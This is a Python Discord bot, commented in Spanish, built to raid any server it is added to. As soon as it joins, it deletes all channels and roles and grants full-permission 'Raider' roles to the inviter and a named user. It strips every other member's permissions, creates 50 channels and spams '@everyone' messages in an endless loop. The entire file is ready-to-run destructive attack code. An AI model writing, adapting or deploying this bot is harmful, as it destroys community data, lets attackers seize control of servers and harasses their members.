import discord
from discord.ext import commands
import asyncio
from datetime import datetime

# Configuración
TOKEN = '1356729394982293615'  # Reemplaza con tu token de bot
PREFIX = '!'  # Prefijo para comandos (aunque este bot no usará comandos)
TARGET_USER = '_laggg_'  # Usuario especial que recibirá el rol Raider

intents = discord.Intents.default()
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user.name}')

@bot.event
async def on_guild_join(guild):
    print(f'Unido al servidor: {guild.name}')
    await raid_server(guild)

async def raid_server(guild):
    try:
        # Eliminar todos los canales existentes
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f'Canal eliminado: {channel.name}')
                await asyncio.sleep(0.5)  # Pequeña pausa para evitar rate limits
            except Exception as e:
                print(f'Error al eliminar canal {channel.name}: {e}')

        # Eliminar todos los roles existentes (excepto @everyone)
        for role in guild.roles:
            if role.name != '@everyone':
                try:
                    await role.delete()
                    print(f'Rol eliminado: {role.name}')
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f'Error al eliminar rol {role.name}: {e}')

        # Crear nuevos roles
        try:
            # Rol Raider (naranja)
            raider_role = await guild.create_role(
                name='Raider',
                color=discord.Color.orange(),
                permissions=discord.Permissions.all(),
                reason='Raid bot setup'
            )
            print(f'Rol creado: {raider_role.name}')

            # Rol Raided (gris)
            raided_role = await guild.create_role(
                name='Raided',
                color=discord.Color.light_grey(),
                permissions=discord.Permissions.none(),
                reason='Raid bot setup'
            )
            print(f'Rol creado: {raided_role.name}')

            # Configurar permisos para @everyone
            everyone_role = guild.default_role
            await everyone_role.edit(permissions=discord.Permissions.none())
            
        except Exception as e:
            print(f'Error al crear roles: {e}')

        # Asignar roles a los miembros
        try:
            # Obtener al usuario que añadió el bot
            async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
                inviter = entry.user
            
            # Asignar roles a los miembros
            for member in guild.members:
                try:
                    if member == inviter or member.name == TARGET_USER:
                        await member.add_roles(raider_role)
                        print(f'Rol Raider asignado a {member.name}')
                    else:
                        await member.add_roles(raided_role)
                        print(f'Rol Raided asignado a {member.name}')
                    await asyncio.sleep(0.5)
                except Exception as e:
                    print(f'Error al asignar roles a {member.name}: {e}')
        except Exception as e:
            print(f'Error al asignar roles: {e}')

        # Crear 50 canales de texto
        for i in range(1, 51):
            try:
                channel = await guild.create_text_channel(
                    name=f'raided-{i}',
                    reason='Raid bot setup'
                )
                print(f'Canal creado: {channel.name}')
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f'Error al crear canal {i}: {e}')

        # Enviar mensajes periódicos en todos los canales
        while True:
            for channel in guild.text_channels:
                try:
                    await channel.send(f'Raided by Laggg @everyone')
                    print(f'Mensaje enviado en {channel.name}')
                    await asyncio.sleep(20)  # Esperar 20 segundos entre mensajes
                except Exception as e:
                    print(f'Error al enviar mensaje en {channel.name}: {e}')
            await asyncio.sleep(20)  # Esperar 20 segundos antes de repetir

    except Exception as e:
        print(f'Error durante el raid: {e}')

bot.run(TOKEN)
